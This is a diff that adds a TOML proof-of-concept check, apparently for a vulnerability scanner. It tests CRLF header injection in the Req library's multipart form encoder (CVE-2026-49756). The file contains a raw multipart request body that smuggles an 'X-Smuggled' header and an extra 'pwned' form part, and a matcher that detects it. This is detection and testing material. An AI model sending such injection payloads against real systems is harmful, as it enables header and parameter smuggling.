@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "验证 Req 多部分表单编码器在 filename/name/content_type 字段中对 CRLF 序列未进行转义或过滤，导致可注入额外 HTTP 头部行或多部分参数走私。通过构造包含 CRLF 序列的恶意 filename，在 multipart 请求体中注入 X-Smuggled 等任意头部。"
+id = "POC-AVE-2026-0752"
+name = "Req 多部分表单头部注入 PoC"
+severity = "low"
+tags = ["ave-2026-0752"]
+vuln_id = [
+    "CVE-2026-49756",
+    "AVE-2026-0752",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/upload"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+-----AveBoundary\r
+Content-Disposition: form-data; name="upload"; filename="harmless.txt"\r
+X-Smuggled: marker\r
+Content-Disposition: form-data; name="pwned"\r
+\r
+injected\r
+-----AveBoundary--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=AveBoundary"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["X-Smuggled"]
